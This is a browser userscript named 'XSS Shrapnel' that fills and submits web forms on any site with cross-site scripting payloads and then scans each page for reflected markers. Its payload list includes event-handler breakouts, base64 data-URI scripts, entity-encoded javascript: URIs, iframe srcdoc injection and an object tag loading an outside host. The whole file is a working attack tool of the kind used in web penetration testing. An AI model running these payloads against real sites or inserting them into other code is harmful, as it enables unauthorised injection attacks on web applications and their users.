// ==UserScript==
// @name        XSS Shrapnel
// @namespace   *
// @description aaa"bbb'{{3*3}}<ddd>zzz
// @include     *
// @version     2.8
// @grant       none
// ==/UserScript==

var bForceUrlEncoded = 1
var bFillHiddenForms = 0
var bNumberedPayloads = 0

var iPayload = 0

var aPayloads = ['aaa"bbb\'{{3*3}}<ddd>zzz', 
		 'aaa"{{3*3}}\'zzz', 
		 'aaa"{{3*3}}zzz', 
		 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>zzz<fff <fff', 
		 'aaa\\"bbb\\\'ccc<ddd >zzz</fff>', 
		 '</title></textarea>aaa"bbb\'ccc<ddd>zzz', 
		 'aaa"><svg onload=alert(document.domain)>zzz', 
		 'aaa" autofocus onfocus="alert(document.domain)"zzz', 
		 'aaa" onmouseover="alert(document.domain)"zzz', 
		 'aaa" accesskey=x onclick="alert(document.domain)"zzz', 
		 'aaa\'-alert(document.domain)-\'zzz', 
		 'aaa"-alert(document.domain)-"zzz', 
		 'aaa"><video src onratechange=prompt(document.domain)>zzz', 
		 'aaa"><object data=http://spqr.zz.mu/xss.html>zzz', 
		 'aaa"><embed src=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>zzz', 
		 'aaa"><xxx onbeforescriptexecute=prompt(document.domain)>zzz', 
		 'aaa"><meta http-equiv=refresh content="0;URL=http://youtu.be/dQw4w9WgXcQ">zzz', 
		 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>zzz', 
		 'aaa"><math href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</math>zzz', 
		 'aaa"><math href=&#x64;&#x61;&#x74;&#x61;:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</math>zzz', 
		 'aaa"><math href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:\u0061\u006C\u0065\u0072\u0074(document.domain)>XSS</math>zzz', 
		 'aaa"><form method=post action=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+><input type=submit value=XSS>zzz', 
		 'aaa"><form><button formaction=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</button>zzz', 
		 'aaa"><iframe srcdoc=&lt;&#x73;&#x76;&#x67;&#x2F;&#x6F;&#x6E;&#x6C;&#x6F;&#x61;&#x64;&equals;&#x61;&#x6C;&#x65;&#x72;&#x74;&lpar;document.domain&rpar;&gt;>zzz']

var regex = /.{0,100}aaa.{0,150}?zzz.{0,100}/gi

window.addEventListener
(
	'keydown', 
	function (e)
	{
		if (e.altKey || e.modifiers)
		{
			if (e.keyCode == 72)
			{
				var sPrompt = prompt ('Fill hidden forms?', bFillHiddenForms)
				
				sPrompt === null || (bFillHiddenForms = parseInt (sPrompt))
			}
			
			if (e.keyCode == 78)
			{
				var sPrompt = prompt ('Numbered payloads', bNumberedPayloads)
				
				sPrompt === null || (bNumberedPayloads = parseInt (sPrompt))
			}
			
			if (e.keyCode == 80)
			{
				var sPrompt = prompt ('Set payload', iPayload)
				
				if (sPrompt !== null)
				{
					if (isNaN (+sPrompt))
					{
						iPayload = InArray (aPayloads, sPrompt)
						
						if (iPayload == -1)
						{
							aPayloads.push (sPrompt)
							
							iPayload = aPayloads.indexOf (sPrompt)
						}
					}
					else
						iPayload = parseInt (sPrompt) % aPayloads.length
				}
				
				prompt ('Payload', aPayloads [iPayload])
			}
			
			if (e.target.form)
			{
				var parentForm = e.target.form
				
				e.keyCode == 83 && submitForm (parentForm)
				e.keyCode == 65 && fillForm (parentForm) && submitForm (parentForm)
			}
			
			if (e.keyCode == 70)
				fillForms ()
			
			if (e.keyCode == 82)
				checkResults ()
		}
	}, 
	false
)

window.addEventListener ('DOMContentLoaded', checkResults, false)
window.addEventListener ('load', checkResults, false)

function checkResults ()
{
	var matches = document.getElementsByTagName ('html') [0].innerHTML.match (regex)
	
	if (matches instanceof Array)
	{
		matches = matches.join ('\r\n\r\n').split (/([\s\S]{10000})/)
		
		matches.forEach (function (i) {i && alert (i)})
	}
}

function fillForms ()
{
	for (var i = 0; i < document.forms.length; i++)
	{
		var form = document.forms [i]
		
		form.target = '_blank'
		
		fillForm (form) && submitForm (form)
	}
}

function submitForm (form)
{
	var aPostData = []
	
	for (var i = 0; i < form.length; i++)
	{
		var sPostData = encodeURIComponent (form [i].name) + '=' + encodeURIComponent (form [i].value)
		
		form [i].name && aPostData.indexOf (sPostData) == -1 && aPostData.push (sPostData)
	}
	
	bForceUrlEncoded && (form.enctype = 'application/x-www-form-urlencoded')
	
	var bFormIsPost = form.getAttribute ('method').toLowerCase () == 'post'
	var sFormAction = typeof form.action == 'string' && form.action || form.getAttribute ('action')
	sFormAction = sFormAction || (bFormIsPost ? location.href : location.origin + location.pathname)
	
	var sDelimeter = bFormIsPost ? '\r\n\r\n' : '?'
	
	var sFormData = sFormAction + sDelimeter + aPostData.join ('&')
	
	confirm (sFormData) && HTMLFormElement.prototype.submit.call (form)
}

function fillForm (form)
{
	for (var i = 0; i < form.length; i++)
	{
		var element = form [i]
		var payload = aPayloads [iPayload]
		
		bNumberedPayloads && (payload += i)
		
		if (element.tagName == 'SELECT' || element.type == 'file')
		{
			element.outerHTML = '<input name="' + htmlEncode (element.name) + '" value="' + htmlEncode (payload) + '" />'
			
			continue
		}
		
		if (!bFillHiddenForms && element.type == 'hidden')
			continue
			
		element.value = payload
	}
	
	return 1
}

function htmlEncode (str)
{
	return str.replace (/</g, '&lt;').replace (/>/g, '&gt;').replace (/"/g, '&quot;').replace (/'/g, '&#39;')
}

function InArray (arr, elem)
{
	for (var i = 0; i < arr.length; i++)
		if (arr [i].indexOf (elem) + 1)
			return i
	
	return -1
}
